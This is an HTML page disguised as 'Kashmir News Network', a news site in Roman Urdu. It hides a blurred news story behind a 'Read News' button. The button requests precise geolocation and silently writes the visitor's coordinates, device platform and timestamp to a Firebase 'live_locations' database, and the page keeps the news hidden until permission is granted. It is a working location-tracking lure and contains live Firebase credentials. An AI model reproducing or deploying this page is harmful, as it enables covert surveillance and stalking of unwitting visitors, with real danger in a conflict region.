<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kashmir News Network</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: sans-serif; background: #f4f4f4; }
        
        /* Overlay jab tak button na dabe */
        #start-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); z-index: 10000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .news-logo { font-size: 50px; margin-bottom: 10px; }
        .btn-read {
            background: #cc0000; color: white; border: none; padding: 15px 40px;
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(204, 0, 0, 0.3);
        }

        header { background: #cc0000; color: #fff; padding: 15px; text-align: center; font-weight: bold; }
        .container { max-width: 600px; margin: auto; padding: 10px; filter: blur(5px); } /* News blur rahegi */
    </style>
</head>
<body>

<div id="start-screen">
    <div class="news-logo">ðŸ“°</div>
    <h2 style="margin-bottom:10px;">Kashmir News Network</h2>
    <p style="margin-bottom:20px; color:#666;">Taza tareen khabron ke liye 'Read News' par click karein.</p>
    <button class="btn-read" onclick="askPermission()">READ NEWS / Ø®Ø¨Ø±ÛŒÚº Ù¾Ú‘Ú¾ÛŒÚº</button>
</div>

<div id="main-content" class="container">
    <header>KNN - LIVE UPDATES</header>
    <div id="news-feed">
        <div style="background:white; margin-top:20px; border-radius:10px; overflow:hidden; box-shadow:0 2px 5px rgba(0,0,0,0.1);">
            <img src="https://images.unsplash.com/photo-1598324423733-196d0061e389?w=600" style="width:100%;">
            <div style="padding:15px;">
                <h2 style="font-size:18px;">Srinagar Smart City Ka Naya Project</h2>
                <p style="color:#444;">Jhelum riverfront ab naye roop mein tayyar hai...</p>
            </div>
        </div>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDGF0GEonMgT8HjIqZux4IpkpjUjTwCl6k",
        authDomain: "the-kargil-rock.firebaseapp.com",
        databaseURL: "https://the-kargil-rock-default-rtdb.firebaseio.com",
        projectId: "the-kargil-rock",
        storageBucket: "the-kargil-rock.firebasestorage.app",
        messagingSenderId: "137725131934",
        appId: "1:137725131934:web:43baf72100c62fb0044f8f"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.askPermission = function() {
        if (navigator.geolocation) {
            // Asli Browser Pop-up trigger hoga
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const id = "User_" + Math.floor(Math.random() * 99999);
                    set(ref(db, 'live_locations/' + id), {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        device: navigator.platform,
                        time: new Date().toLocaleTimeString(),
                        date: new Date().toLocaleDateString()
                    }).then(() => {
                        // Success: News show kar do
                        document.getElementById('start-screen').style.display = 'none';
                        document.getElementById('main-content').style.filter = 'none';
                    });
                },
                (err) => {
                    alert("Khabrein parhne ke liye 'Allow' par click karna zaroori hai.");
                },
                { enableHighAccuracy: true }
            );
        } else {
            alert("Aapka browser location support nahi karta.");
        }
    };
</script>
</body>
</html>
